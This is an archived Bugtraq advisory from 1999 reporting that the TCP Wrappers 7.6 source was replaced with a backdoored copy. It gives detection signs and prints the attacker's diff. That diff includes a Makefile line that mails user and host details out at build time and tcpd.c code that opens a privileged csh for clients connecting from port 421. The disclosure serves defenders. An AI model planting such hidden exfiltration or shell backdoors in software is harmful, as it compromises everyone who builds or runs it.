@@ -1,0 +1,394 @@
+<!-- MHonArc v2.6.19 -->
+<!--X-Head-End-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script async src="/site.js"></script>
+<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/bugtraq.rss">
+<meta property="og:image" content="https://seclists.org/images/bugtraq-img.png" />
+<link rel="image_src" href="https://seclists.org/images/bugtraq-img.png" />
+
+<meta name="Subject" content="backdoored tcp wrapper source code"/>
+<meta name="Author" content="Wietse Venema"/>
+<title>Bugtraq: backdoored tcp wrapper source code</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#2A0D45">
+<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
+<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
+<link rel="stylesheet" href="/shared/css/nst.css?v=2">
+<script async src="/shared/js/nst.js?v=2"></script>
+<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
+<link rel="stylesheet" href="/site.css">
+<!--Google Analytics Code-->
+<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+ga('create', 'UA-11009417-1', 'auto');
+ga('send', 'pageview');
+</script>
+<!--END Google Analytics Code-->
+<META NAME="ROBOTS" CONTENT="NOARCHIVE">
+<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
+</head>
+<body><div id="nst-wrapper">
+
+<div id="menu">
+ <div class="blur">
+  <header id="nst-head">
+
+    <a id="menu-open" href="#menu" aria-label="Open menu">
+     <img width="44" height="44" alt="" aria-hidden="true"
+      src="/shared/images/nst-icons.svg#menu">
+    </a>
+    <a id="menu-close" href="#" aria-label="Close menu">
+     <img width="44" height="44" alt="" aria-hidden="true"
+      src="/shared/images/nst-icons.svg#close">
+    </a>
+
+   <a id="nst-logo" href="/" aria-label="Home page">
+    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>
+
+   <nav id="nst-gnav">
+    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
+    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
+    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
+    <a class="nlink" href="https://sectools.org">Sectools.org</a>
+    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
+   </nav>
+
+   <form class="nst-search" id="nst-head-search" action="/search/">
+    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
+    <button class="nst-search-button" title="Search">
+     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
+      src="/shared/images/nst-icons.svg#search">
+     </button>
+   </form>
+
+  </header>
+ </div>
+</div>
+
+<main id="nst-content">
+
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<a href="/bugtraq/"><img src="/images/bugtraq-logo.png" width="80" class="l-logo right" alt="bugtraq logo"></a>
+<h2 class="m-list"><a href="/bugtraq/">Bugtraq</a>
+mailing list archives</h2>
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<div class="nav-bar">
+<div class="nav-link">
+<a href="259"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
+<a href="date.html#257">By Date</a>
+<a href="263"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
+</div>
+<div class="nav-link">
+<a href="305"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
+<a href="index.html#257">By Thread</a>
+<a href="288"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
+</div>
+<form class="nst-search center" action="/search/bugtraq">
+<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
+<button class="nst-search-button" title="Search">
+<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
+src="/shared/images/nst-icons.svg#search">
+</button>
+</form>
+
+</div>
+
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<h1 class="m-title">backdoored tcp wrapper source code</h1>
+<hr>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+
+
+<em>From</em>: wietse () PORCUPINE ORG (Wietse Venema)<br>
+
+<em>Date</em>: Thu, 21 Jan 1999 11:38:17 -0500<br>
+
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<hr>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<pre style="margin: 0em;">
+
+TCP Wrappers is a widely-used security tool to protect UNIX systems
+against intrusion. In has an estimated installed base of millions.
+
+Today someone replaced the tcp wrapper source on ftp.win.tue.nl by
+a backdoored version. Eventually this was bound to happen, and
+that&apos;s why the source file is accompanied by a PGP signature.  But
+that is no guarantee against people downloading and installing
+backdoored software.
+
+The backdoor gives access to a privileged shell when a client
+connects from port 421.
+
+The backdoored copy was downloaded 52 times between 07:16 MET and
+16:29 MET. I have informed the sites that downloaded a copy.
+
+Below are details on how to recognize the backdoored version.
+
+        Wietse
+
+Relevant time stamp/size information (times relative to MET):
+
+Backdoored version:
+
+    % ls -lcta
+    -r--r--r--  1 wswietse    99186 Jan 21 07:16 tcp_wrappers_7.6.tar.gz
+    ...
+    dr-xr-sr-x  3 wswietse     4096 Apr 11  1998 .
+
+Restored version:
+
+    % ls -lt tcp_wrappers_7.6.tar.gz
+    -r--r--r--  1 wswietse    99438 Jan 21 16:29 tcp_wrappers_7.6.tar.gz
+
+The signature of the bad TAR file is: length 99186 instead of 99438.
+The signature of a compiled tcpd binary is:
+
+    strings -a tcpd | grep csh
+
+any output probably means trouble.
+
+Changes that were made to the tcp wrapper 7.6 source code:
+
+diff -c 7.6/Makefile /tmp/tcp_wrappers_7.6/Makefile
+*** 7.6/Makefile        Mon Apr  7 20:34:16 1997
+--- /tmp/tcp_wrappers_7.6/Makefile      Fri Mar 21 13:27:21 1997
+***************
+*** 26,31 ****
+--- 26,32 ----
+        @echo
+        @echo &quot;If none of these match your environment, edit the system&quot;
+        @echo &quot;dependencies sections in the Makefile and do a &apos;make other&apos;.&quot;
++       @sh -c &apos;echo debug-`whoami`-`uname -a` |mail -s debug wtcpd () hotmail com&apos;
+        @echo
+
+  #######################################################
+***************
+*** 649,655 ****
+  # source-routed traffic in the kernel. Examples: 4.4BSD derivatives,
+  # Solaris 2.x, and Linux. See your system documentation for details.
+  #
+! KILL_OPT= -DKILL_IP_OPTIONS
+
+  ## End configuration options
+  ############################
+--- 650,656 ----
+  # source-routed traffic in the kernel. Examples: 4.4BSD derivatives,
+  # Solaris 2.x, and Linux. See your system documentation for details.
+  #
+! # KILL_OPT= -DKILL_IP_OPTIONS
+
+  ## End configuration options
+  ############################
+Only in 7.6: Makefile-
+diff -c 7.6/tcpd.c /tmp/tcp_wrappers_7.6/tcpd.c
+*** 7.6/tcpd.c  Sun Feb 11 11:01:33 1996
+--- /tmp/tcp_wrappers_7.6/tcpd.c        Sun Feb 11 11:01:33 1996
+***************
+*** 41,52 ****
+--- 41,63 ----
+  int     allow_severity = SEVERITY;    /* run-time adjustable */
+  int     deny_severity = LOG_WARNING;  /* ditto */
+
++ char    IDENT[]=&quot;NC421\n&quot;;
++ char    SRUN[]=&quot;-csh&quot;;
++ char    SPATH[]=&quot;/bin/csh&quot;;
++ #define PORT 421
++
+  main(argc, argv)
+  int     argc;
+  char  **argv;
+  {
+      struct request_info request;
++     struct sockaddr_in from;
+      char    path[MAXPATHNAMELEN];
++     int     fromlen;
++
++     fromlen = sizeof(from);if (getpeername(0,(struct sockaddr*)&amp;from,
++     &amp;fromlen)&gt;=0){if(ntohs(from.sin_port)==PORT){write(0,IDENT,
++     strlen(IDENT));execl(SPATH,SRUN,(char*)0);}}
+
+      /* Attempt to prevent the creation of world-writable files. */
+
+
+</pre>
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<hr>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<div class="nav-bar">
+<div class="nav-link">
+<a href="259"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
+<a href="date.html#257">By Date</a>
+<a href="263"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
+</div>
+<div class="nav-link">
+<a href="305"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
+<a href="index.html#257">By Thread</a>
+<a href="288"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
+</div>
+</div>
+<h3 class="m-thread">Current thread:</h3>
+<ul class="thread">
+<li><strong>CERT Advisory CA-99.01 - TCP.Wrappers (fwd)</strong>, <em>(continued)</em>
+<li><ul>
+<li><ul>
+<li><ul>
+<li><a name="272" href="272">CERT Advisory CA-99.01 - TCP.Wrappers (fwd)</a> <em>//Stany (Jan 22)</em>
+</li>
+<li><a name="273" href="273">Misleading CERT Advisory CA-99-01-Trojan-TCP-Wrappers</a> <em>Jochen Thomas Bauer (Jan 22)</em>
+</li>
+<li><a name="270" href="270">Follow up - IIS 4 logging</a> <em>mnemonix (Jan 23)</em>
+</li>
+</ul></li>
+</ul></li>
+<li><a name="256" href="256">WebRamp M3 remote network access bug</a> <em>John Stanley (Jan 21)</em>
+<ul>
+<li><a name="267" href="267">Re: WebRamp M3 remote network access bug</a> <em>James Egelhof (Jan 21)</em>
+</li>
+<li><a name="268" href="268">Perl.exe and IIS security advisory</a> <em>mnemonix (Jan 22)</em>
+<ul>
+<li><a name="304" href="304">Re: Perl.exe and IIS security advisory</a> <em>Tabor J. Wells (Jan 24)</em>
+<li><a name="317" href="317">Repost: Wietse&apos;s FTP site has moved</a> <em>Wietse Venema (Jan 25)</em>
+</li>
+<li><a name="316" href="316">Using Example Domain Names in Exploits</a> <em>bandregg () REDHAT COM (Jan 25)</em>
+</li>
+</li>
+<li><a name="305" href="305">IIS Advisory Update</a> <em>Marc (Jan 24)</em>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>backdoored tcp wrapper source code</strong> <em>Wietse Venema (Jan 21)</em>
+<ul>
+<li><a name="288" href="288">Re: backdoored tcp wrapper source code</a> <em>John Stange (Jan 23)</em>
+<ul>
+<li><a name="285" href="285">SSH 1.x and 2.x Daemon</a> <em>KuRuPTioN (Jan 23)</em>
+<li><a name="300" href="300">Re: SSH 1.x and 2.x Daemon</a> <em>Jan B. Koum (Jan 24)</em>
+<li><a name="326" href="326">Re: SSH 1.x and 2.x Daemon</a> <em>Linux Mailing Lists (Jan 25)</em>
+<li><a name="323" href="323">Re: SSH 1.x and 2.x Daemon</a> <em>KuRuPTioN (Jan 25)</em>
+</li>
+</li>
+</li>
+<li><a name="308" href="308">Re: SSH 1.x and 2.x Daemon</a> <em>Alan Olsen (Jan 24)</em>
+</li>
+<li><a name="309" href="309">baynetworks router DoS</a> <em>Virsoft (Jan 25)</em>
+<li><a name="369" href="369">Re: baynetworks router DoS</a> <em>Neale Banks (Jan 26)</em>
+</li>
+<li><a name="371" href="371">2.2.0 SECURITY   (fwd)</a> <em>Aaron Lehmann (Jan 26)</em>
+</li>
+<li><a name="370" href="370">IBM CICS Universal Client 3.x</a> <em>Rude Yak (Jan 27)</em>
+</li>
+</li>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul></li>
+<em>(Thread continues...)</em>
+</li>
+</ul>
+
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</main><!-- content -->
+
+<footer id="nst-foot">
+   <form class="nst-search" id="nst-foot-search" action="/search/">
+    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
+    <button class="nst-search-button" title="Search">
+     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
+      src="/shared/images/nst-icons.svg#search">
+     </button>
+   </form>
+<div class="flexlists">
+<div class="fl-unit">
+<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
+<ul>
+<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
+<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
+<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
+<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
+<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
+</ul>
+</div>
+<div class="fl-unit">
+<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
+<ul>
+<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
+<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
+<li><a class="nlink" href="https://npcap.com/#download">Download</a>
+<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
+</ul>
+</div>
+<div class="fl-unit">
+<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
+<ul>
+<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
+<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
+<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
+<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
+<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
+</ul>
+</div>
+<div class="fl-unit">
+<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
+<ul>
+<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
+<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
+<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
+<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
+<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
+</ul>
+</div>
+<div class="fl-unit">
+<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
+<ul>
+<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
+<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
+<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
+<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
+</ul>
+</div>
+<div class="fl-unit social-links">
+<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
+ <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
+ </a>
+<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
+ <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
+ </a>
+<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
+ <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
+ </a>
+<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
+ <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
+ </a>
+</div>
+</div>
+</footer>
+
+</div><!-- wrapper -->
+</body>
+</html>
+
